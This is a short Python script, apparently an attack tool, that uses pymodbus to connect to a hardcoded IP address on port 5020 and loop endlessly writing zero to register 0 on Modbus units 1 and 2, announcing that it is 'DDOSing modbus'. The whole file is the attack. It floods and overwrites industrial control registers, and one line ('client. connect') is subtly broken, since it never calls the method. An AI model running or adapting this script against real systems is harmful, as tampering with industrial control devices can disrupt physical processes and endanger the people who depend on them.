
from pymodbus.client.sync import ModbusTcpClient as ModbusClient

def main():
    print("Connecting...")
    client = ModbusClient('111.220.27.216',5020)
    client. connect
    print("\r    Connected!")
    print("DDOSing modbus...")
    try:
        while True:
            client.write_register(0,0,unit=1)
            client.write_register(0,0,unit=2)
    except:
        print("Exiting")
if __name__=="__main__":
    main()
